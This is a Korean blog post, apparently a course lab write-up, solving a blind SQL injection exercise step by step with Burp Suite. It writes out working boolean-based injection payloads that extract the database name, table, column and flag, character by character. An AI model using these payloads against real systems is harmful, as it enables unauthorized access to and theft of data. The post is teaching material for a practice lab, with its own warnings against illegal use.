---
layout: single
title:  "7 주차 SQL injection 데이터 추출 문제 풀이(2)"
categories: SQL-injection
typora-root-url: ..\
author_profile: false
---

<br>

# <span style="background:#000000; color:#ffffff">1. 7 주차 SQL injection 데이터 추출 문제 풀이(2)</span>

<br><span style='font-weight:bold; font-size:15px'> ※ 주의 사항 :</span>   

<span style='font-weight:bold; font-size:15px'>1. 교육 목적으로만 이용 해주세요.</span><br>
<span style='font-weight:bold; font-size:15px'>2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br>
<span style='font-weight:bold; font-size:15px'>3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span>

<br>

## <span style="background:#696969; color:#ffffff">1.1 개요 </span>

<br>

SQL injection 데이터 추출 방식에는 3 가지 방식이 있습니다.

<br>

<span style='font-weight:bold; font-size:15px'>1. SQL 질의 문 결과가 화면에 출력 되는 경우(데이터추출(2)) => UNION SQLi (로그인 or 게시판 등)</span>

<span style='font-weight:bold; font-size:15px'>2. 에러 메세지가 화면에 출력 되는 경우(데이터추출(3)) => Error Based SQLi (에러 메세지 확인 가능 한 곳)</span>

<span style='font-weight:bold; font-size:15px'>3. 참과 거짓으로 출력 되는 경우(데이터추출(4)) => Blind SQLi (로그인 or 아이디 중복 체크 등)</span>

<br>

## <span style="background:#696969; color:#ffffff">1.2  Blind SQL injection</span>

<br>

🖥SQL injection 데이터 추출(4)과 추출된 값을 제외하고,  문제 풀이 과정은 같습니다.🖥

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.1 sql injection 포인트 찾기</span>

***

<br>

<img src="/images/2024-06-05-SQLinjection19/image-20240605042213272.png" alt="image-20240605042213272" style="zoom:67%;" />

<img src="/images/2024-06-05-SQLinjection19/image-20240601125007358.png" alt="image-20240601125007358" style="zoom:67%;" />

<img src="/images/2024-06-05-SQLinjection19/image-20240605042238453.png" alt="image-20240605042238453" style="zoom:67%;" />



SQL 구문을 사용할 수 있고, 참 거짓을 확인 할 수 있다

▶ sql 구문 error메세지는 안 뜨므로 Blind sqli 가능!

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.2 select 문구가 사용가능한 지 체크</span>

***

<br>

<img src="/images/2024-06-05-SQLinjection19/image-20240601125219643.png" alt="image-20240601125219643" style="zoom:67%;" />

<img src="/images/2024-06-05-SQLinjection19/image-20240601125237816.png" alt="image-20240601125237816" style="zoom:67%;" />

중간 and 문에도 참 거짓이 확인 됨
▶ Blind sqli 가능!

<img src="/images/2024-06-05-SQLinjection19/image-20240601125358300.png" alt="image-20240601125358300" style="zoom:67%;" />

<img src="/images/2024-06-05-SQLinjection19/image-20240601125648850.png" alt="image-20240601125648850" style="zoom:67%;" />

select문으로 바꿔서 작성해도 참 거짓 확인 됨

▶ Blind sqli 가능!

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.3 공격 format 만들기</span>

***

<br>

normaltic' and ascii(substr((select 'test'),1,1)>0) and '1'='1

<img src="/images/2024-06-05-SQLinjection19/image-20240601125950843.png" alt="image-20240601125950843" style="zoom:67%;" />



위의 구문 대로 라면 t가 나와야 한다. 그게 0보다 크므로 글자가 존재한다는 뜻이다.

<br>

따라서 

normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select~~~</span>),1,1)>0) and '1'='1

이와 같이 select 부분만 바꿔서 계속 쓸 수 있도록 공격 format을 만들 수 있습니다.

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.4 DB이름 확인하기</span>

***

<br>

DB 이름 확인하는 법은   
select database() 이므로,   
<br>

공격 format   
normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select~~~</span>),1,1)>0) and '1'='1  
에 대입한다.   
<br>

normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select database() limit 0,1</span>),1,1)>0) and '1'='1

찾을 때 burp suite을 이용하면 간편합니다!!

<span style='font-weight:bold; font-size:20px'>(Blind SQLi) 😊Burp suite로 <span style='text-decoration: red wavy underline'>데이터  확인:</span>😊</span>

<img src="/images/2024-06-05-SQLinjection19/image-20240605042910389.png" alt="image-20240605042910389" style="zoom:60%;" />

SQLi를 구성한 부분이 인코딩 되어 나타났습니다. 이걸 편히 보기 위해 디코딩한 결과로 보이게 끔 만들어 줘야 합니다.

<img src="/images/2024-06-05-SQLinjection19/캡처_2024_06_05_04_33_20_359-1717529725549-31.png" alt="캡처_2024_06_05_04_33_20_359" style="zoom:60%;" />

<img src="/images/2024-06-05-SQLinjection19/캡처_2024_06_05_04_36_28_931.png" alt="캡처_2024_06_05_04_36_28_931" style="zoom:60%;" />

또한, 서버로 보낼 때마다 '존재하는 아이디' 인지 아닌지 참 거짓을 수시로 알아야 하므로, 검색 창에 ''존재하는 아이디입니다.' 를 검색해서 찾고 Auto-scroll to match when text changes의 체크 박스를 선택해 줍니다.

<img src="/images/2024-06-05-SQLinjection19/image-20240605045606302.png" alt="image-20240605045606302" style="zoom:60%;" />

100을 집어 넣었을 때 오른 쪽에 존재하는 아이디라고 뜨지 않으므로, 100보다 작다.

<img src="/images/2024-06-05-SQLinjection19/image-20240605045847831.png" alt="image-20240605045847831" style="zoom:60%;" />

확인한 결과 98이었고, ascii 코드 표에 의하면 'b'이다.

전부 다 구해보니 blindSqli이었다.

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.5 table이름 확인하기</span>

***

<br>

table 이름 확인하는 법은  
select table_name from information_schema.tables where table_schema='DB name' limit 0,1 이므로,   
<br>

공격 format   
normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select~~~</span>),1,1)>0) and '1'='1  
에 대입한다.   
<br>

normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select table_name from information_schema.tables where table_schema='blindSqli' limit 0,1</span>),1,1)>0) and '1'='1

<br>

<img src="/images/2024-06-05-SQLinjection19/image-20240605050806866.png" alt="image-20240605050806866" style="zoom:60%;" />

102에서 존재하므로, f 이다.  
다 구한 결과, flagTable이었다.

#### <span style="background:#A9A9A9; color:#ffffff">1.2.6 column 이름 확인하기</span>

***

<br>

column 이름 확인하는 법은  
select column_name from information_schema.columns where table_name='table name' limit 0,1 이므로,   
<br>

공격 format   
normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select~~~</span>),1,1)>0) and '1'='1  
에 대입한다.   
<br>

normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select column_name from information_schema.columns where table_name='flagTable' limit 0,1</span>),1,1)>0) and '1'='1



<br>

<img src="/images/2024-06-05-SQLinjection19/image-20240605050956352.png" alt="image-20240605050956352" style="zoom:60%;" />

구한 결과, flag



#### <span style="background:#A9A9A9; color:#ffffff">1.2.7 data 추출하기</span>

***

<br>

normaltic' and ascii(substr((<span style="font-weight:bold; color: orange">select flag from flagTable limit 0,1</span>),1,1)>0) and '1'='1

<br>

<img src="/images/2024-06-05-SQLinjection19/image-20240605051625538.png" alt="image-20240605051625538" style="zoom:60%;" />

115는 s 이다.  
다 구해 보면, segfault{~~~} 가 나왔다.    
답을 알려 줄 수 없으므로 직접 해보길 바란다.